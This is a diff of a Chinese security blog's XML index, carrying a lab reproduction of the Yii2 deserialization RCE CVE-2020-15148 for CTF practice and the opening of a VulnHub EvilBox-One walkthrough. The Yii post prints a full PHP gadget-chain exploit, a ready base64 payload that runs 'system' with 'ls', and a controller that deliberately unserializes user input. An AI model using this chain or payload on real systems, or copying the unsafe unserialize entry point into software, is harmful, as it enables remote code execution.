@@ -422,6 +422,99 @@
       </categories>
   </entry>
   <entry>
+    <title>CVE-2020-15148 PHP-Yii框架反序列化漏洞复现</title>
+    <url>/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="CVE-2020-15148-PHP-Yii框架反序列化漏洞复现"><a href="#CVE-2020-15148-PHP-Yii框架反序列化漏洞复现" class="headerlink" title="CVE-2020-15148 PHP-Yii框架反序列化漏洞复现"></a>CVE-2020-15148 PHP-Yii框架反序列化漏洞复现</h1><span id="more"></span>
+
+<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png"></p>
+<p>在ctfshow web267 这题中很好的体现了此漏洞。</p>
+<p>参考链接:<a href="https://www.freebuf.com/vuls/260352.html">CVE-2020-15148 Yii2反序列化RCE分析与复现 - FreeBuf网络安全行业门户</a></p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
+<li><p><a href="https://github.com/yiisoft/yii2/releases/tag/2.0.37">Release 2.0.37 · yiisoft/yii2 (github.com)</a></p>
+</li>
+<li><p>下载 : yii-basic-app-2.0.37.tgz</p>
+</li>
+</ul>
+<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png"></p>
+<ul>
+<li><p>系统环境: kali 2021（子系统）</p>
+</li>
+<li><p>将下载的压缩包解压，进入目录将会看到如下文件:</p>
+</li>
+</ul>
+<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png"></p>
+<ul>
+<li>进入 ./confog/web.php 将 cookieValidationKey 修改一下，内容随便都可以。不修改启动网页将报错。</li>
+</ul>
+<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png"></p>
+<ul>
+<li>输入 php yii serve 启动这个网页。本地8080端口并本地查看</li>
+</ul>
+<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png"></p>
+<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png"></p>
+<ul>
+<li><p>如图所示成功访问页面，接下来 尝试 弱口令登陆: admin:admin</p>
+</li>
+<li><p>创建反序列化入口: ./controllers/TestController.php</p>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BackdoorController</span> <span class="keyword">extends</span> \<span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionShell</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> unserialize(base64_decode(<span class="variable">$code</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ul>
+<li>入口创建成功，现在来看看大佬的 exp：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">        <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">            <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">            <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;phpinfo&#x27;</span>; <span class="comment">// 可控参数</span></span><br><span class="line">                <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;1&#x27;</span>; <span class="comment">// 可控参数</span></span><br><span class="line">                <span class="comment">//             4</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">        <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">            <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction, <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">                <span class="comment">//                             3</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">        <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">            <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">                <span class="comment">//                     2</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span>&#123;</span><br><span class="line">        //                             1</span><br><span class="line">        <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在 1 处 可以看到 new yii\db\BatchQueryResult 对象，从而执行了 class BatchQueryResult中的 construct()函数( 2  )。</li>
+<li>在 2 处  construct()函数中，new Generator 对象，从而执行了 class Generator中的 construct()函数( 3 )</li>
+<li>在 3 处  construct()函数中，new CreateAction 对象，从而执行了 class CreateAction 中的construct()函数中的可控参数（ 4 ）</li>
+<li>这个执行过程就是一个套娃环节。</li>
+<li>现在大致了解了 exp 是如何运行的了。</li>
+<li>所以现在来利用一下这个 exp 吧。深层次的我也解释不清而且这个复现网上很多，能用就行。</li>
+</ul>
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><ul>
+<li>url 入口:</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost:8080/index.php?r=backdoor/shell&amp;code=xxx // xxx 为 exp 生成的内容。</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>首先将可控参数设置为 phpinfo 并查看是否会显示处我本地的 php环境。</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line"><span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;phpinfo&#x27;</span>; <span class="comment">// 可控参数</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;1&#x27;</span>; <span class="comment">// 可控参数</span></span><br><span class="line">……</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png"></p>
+<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png"></p>
+<ul>
+<li>如图所示成功显示了 phpinfo 信息。</li>
+<li>再将可控参数改为我们想执行的语句。</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line"><span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>; <span class="comment">// 可控参数,注意 若 system不可用,可用passthru，shell_exec 等代替。</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;ls&#x27;</span>; <span class="comment">// 可控参数</span></span><br><span class="line">……</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png"></p>
+<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.png"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost:8080/index.php?r=backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6Njoic3lzdGVtIjtzOjI6ImlkIjtzOjI6ImxzIjt9aToxO3M6MzoicnVuIjt9fX19</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png"></p>
+<ul>
+<li><p>如图所示成功显示出当前目录下的内容。</p>
+</li>
+<li><p>至此，我们可以通过这个漏洞来达到我们的目的。</p>
+</li>
+</ul>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
+<li>CVE-2020-15148</li>
+<li>这个漏洞，可能会作为变种出现的 CTF web 题当中，ctshow web267 就是最好的例子。</li>
+<li>革命尚未成功，我等还需努力。</li>
+<li>PHP 是世界上最好的语言。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>CTF笔记</category>
+        <category>漏洞复现</category>
+      </categories>
+  </entry>
+  <entry>
     <title>CTFShow 文件包含笔记</title>
     <url>/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/</url>
     <content><![CDATA[<h1 id="CTFShow-文件包含笔记"><a href="#CTFShow-文件包含笔记" class="headerlink" title="CTFShow 文件包含笔记"></a>CTFShow 文件包含笔记</h1><h2 id="web78——文件包含——php伪协议"><a href="#web78——文件包含——php伪协议" class="headerlink" title="web78——文件包含——php伪协议"></a>web78——文件包含——php伪协议</h2><p>源码:</p>
@@ -588,99 +681,6 @@
       </categories>
   </entry>
   <entry>
-    <title>CVE-2020-15148 PHP-Yii框架反序列化漏洞复现</title>
-    <url>/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="CVE-2020-15148-PHP-Yii框架反序列化漏洞复现"><a href="#CVE-2020-15148-PHP-Yii框架反序列化漏洞复现" class="headerlink" title="CVE-2020-15148 PHP-Yii框架反序列化漏洞复现"></a>CVE-2020-15148 PHP-Yii框架反序列化漏洞复现</h1><span id="more"></span>
-
-<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png"></p>
-<p>在ctfshow web267 这题中很好的体现了此漏洞。</p>
-<p>参考链接:<a href="https://www.freebuf.com/vuls/260352.html">CVE-2020-15148 Yii2反序列化RCE分析与复现 - FreeBuf网络安全行业门户</a></p>
-<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
-<li><p><a href="https://github.com/yiisoft/yii2/releases/tag/2.0.37">Release 2.0.37 · yiisoft/yii2 (github.com)</a></p>
-</li>
-<li><p>下载 : yii-basic-app-2.0.37.tgz</p>
-</li>
-</ul>
-<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png"></p>
-<ul>
-<li><p>系统环境: kali 2021（子系统）</p>
-</li>
-<li><p>将下载的压缩包解压，进入目录将会看到如下文件:</p>
-</li>
-</ul>
-<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png"></p>
-<ul>
-<li>进入 ./confog/web.php 将 cookieValidationKey 修改一下，内容随便都可以。不修改启动网页将报错。</li>
-</ul>
-<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png"></p>
-<ul>
-<li>输入 php yii serve 启动这个网页。本地8080端口并本地查看</li>
-</ul>
-<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png"></p>
-<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png"></p>
-<ul>
-<li><p>如图所示成功访问页面，接下来 尝试 弱口令登陆: admin:admin</p>
-</li>
-<li><p>创建反序列化入口: ./controllers/TestController.php</p>
-</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BackdoorController</span> <span class="keyword">extends</span> \<span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionShell</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> unserialize(base64_decode(<span class="variable">$code</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ul>
-<li>入口创建成功，现在来看看大佬的 exp：</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">        <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">            <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">            <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;phpinfo&#x27;</span>; <span class="comment">// 可控参数</span></span><br><span class="line">                <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;1&#x27;</span>; <span class="comment">// 可控参数</span></span><br><span class="line">                <span class="comment">//             4</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">        <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">            <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction, <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">                <span class="comment">//                             3</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">        <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">            <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">                <span class="comment">//                     2</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span>&#123;</span><br><span class="line">        //                             1</span><br><span class="line">        <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>在 1 处 可以看到 new yii\db\BatchQueryResult 对象，从而执行了 class BatchQueryResult中的 construct()函数( 2  )。</li>
-<li>在 2 处  construct()函数中，new Generator 对象，从而执行了 class Generator中的 construct()函数( 3 )</li>
-<li>在 3 处  construct()函数中，new CreateAction 对象，从而执行了 class CreateAction 中的construct()函数中的可控参数（ 4 ）</li>
-<li>这个执行过程就是一个套娃环节。</li>
-<li>现在大致了解了 exp 是如何运行的了。</li>
-<li>所以现在来利用一下这个 exp 吧。深层次的我也解释不清而且这个复现网上很多，能用就行。</li>
-</ul>
-<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><ul>
-<li>url 入口:</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost:8080/index.php?r=backdoor/shell&amp;code=xxx // xxx 为 exp 生成的内容。</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>首先将可控参数设置为 phpinfo 并查看是否会显示处我本地的 php环境。</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line"><span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;phpinfo&#x27;</span>; <span class="comment">// 可控参数</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;1&#x27;</span>; <span class="comment">// 可控参数</span></span><br><span class="line">……</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png"></p>
-<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png"></p>
-<ul>
-<li>如图所示成功显示了 phpinfo 信息。</li>
-<li>再将可控参数改为我们想执行的语句。</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line"><span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>; <span class="comment">// 可控参数,注意 若 system不可用,可用passthru，shell_exec 等代替。</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;ls&#x27;</span>; <span class="comment">// 可控参数</span></span><br><span class="line">……</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png"></p>
-<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.png"></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost:8080/index.php?r=backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6Njoic3lzdGVtIjtzOjI6ImlkIjtzOjI6ImxzIjt9aToxO3M6MzoicnVuIjt9fX19</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png"></p>
-<ul>
-<li><p>如图所示成功显示出当前目录下的内容。</p>
-</li>
-<li><p>至此，我们可以通过这个漏洞来达到我们的目的。</p>
-</li>
-</ul>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
-<li>CVE-2020-15148</li>
-<li>这个漏洞，可能会作为变种出现的 CTF web 题当中，ctshow web267 就是最好的例子。</li>
-<li>革命尚未成功，我等还需努力。</li>
-<li>PHP 是世界上最好的语言。</li>
-</ul>
-]]></content>
-      <categories>
-        <category>CTF笔记</category>
-        <category>漏洞复现</category>
-      </categories>
-  </entry>
-  <entry>
     <title>vulnhub靶场——DarkHole-2</title>
     <url>/2022/02/18/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94DarkHole-2/</url>
     <content><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>攻击机： kali, win11<br><br>靶机: DARKHOLE: 2 NAT 192.168.91.0 网段<br><br>下载链接:</p>
@@ -692,7 +692,7 @@
 <p>挨个儿访问</p>
 <h3 id="git-泄露"><a href="#git-泄露" class="headerlink" title="git 泄露"></a>git 泄露</h3><p><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220218105450.png"><br><strong>python2 .\git_extract.py <a href="http://192.168.91.191/.git/">http://192.168.91.191/.git/</a></strong><br><br>注意：git_extract 工具有时候可能下载不完整，推荐方法换一个工具，github开源很多。<br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220218105124.png"><br><br>用工具下载到本地。<br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220218105212.png"></p>
 <h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><p><strong>index.php</strong> 中：<br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220218105813.png"><br><br>很明显看到 dashboard.php?id=xxxx， 且 跟 SESSION 相关。</p>
-<p><strong>login.php</strong>中:<br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220218105925.png"><br><br>如图所示：有账号密码(<strong><a href="mailto:&#108;&#x75;&#x73;&#104;&#x40;&#97;&#x64;&#x6d;&#x69;&#x6e;&#x2e;&#x63;&#x6f;&#109;">&#108;&#x75;&#x73;&#104;&#x40;&#97;&#x64;&#x6d;&#x69;&#x6e;&#x2e;&#x63;&#x6f;&#109;</a>:321</strong>)，待会儿看能不能登陆进去。</p>
+<p><strong>login.php</strong>中:<br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220218105925.png"><br><br>如图所示：有账号密码(<strong><a href="mailto:&#108;&#x75;&#x73;&#x68;&#64;&#97;&#x64;&#109;&#x69;&#x6e;&#46;&#x63;&#x6f;&#109;">&#108;&#x75;&#x73;&#x68;&#64;&#97;&#x64;&#109;&#x69;&#x6e;&#46;&#x63;&#x6f;&#109;</a>:321</strong>)，待会儿看能不能登陆进去。</p>
 <p><strong>login.php 0904b1</strong> 中:<br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220218110150.png"><br><br>如图所示: 得到了 sql 语句，其中对 email,pass 两个变量调用了 <strong>mysqli_real_escape_string</strong>,<strong>htmlspecialchars</strong> 这两个函数，这两个函数的作用大致就是对其输入进行转换过滤，那么在<strong>登陆界面</strong>sql注入几乎是不太可能的了。函数具体用法自行翻看手册。</p>
 <p><strong>config.php</strong> 中:<br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220218110713.png"><br><br>如图所示: 用户名: root ，密码：空，数据库: darkhole_2</p>
 <p><strong>COMMIT_EDITMSG</strong> 中:<br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220218110827.png"><br><br>如图所示: 翻译过来:  我更改了 login.php 文件以更安全</p>
@@ -730,6 +730,72 @@
 <li>命令执行</li>
 <li>反弹shell</li>
 <li>CVE-2021-4034</li>
+</ol>
+]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>vulnhub靶场——EvilBox---One</title>
+    <url>/2022/03/04/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94EvilBox-One/</url>
+    <content><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>攻击机：kali/win11<br><br>靶机：evilbox:one : NAT 192.168.91.0 网段<br><br>下载链接:</p>
+<p><a href="https://download.vulnhub.com/evilbox/EvilBox---One.ova.torrent">https://download.vulnhub.com/evilbox/EvilBox—One.ova.torrent</a></p>
+<p><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220304123550.png"></p>
+<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>测试发现靶机不能正常获取IP地址。需要进入拯救模式修改网卡配置信息，将 错误的网卡名称修改为 ens33即可。<br><br>参考链接:</p>
+<p><a href="https://www.ohhhhhh.top/2021/12/09/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94dawn/">https://www.ohhhhhh.top/2021/12/09/web渗透——dawn/</a></p>
+<h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p><strong>python3 ping.py -H 192.168.91.0/24</strong><br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220304123846.png"></p>
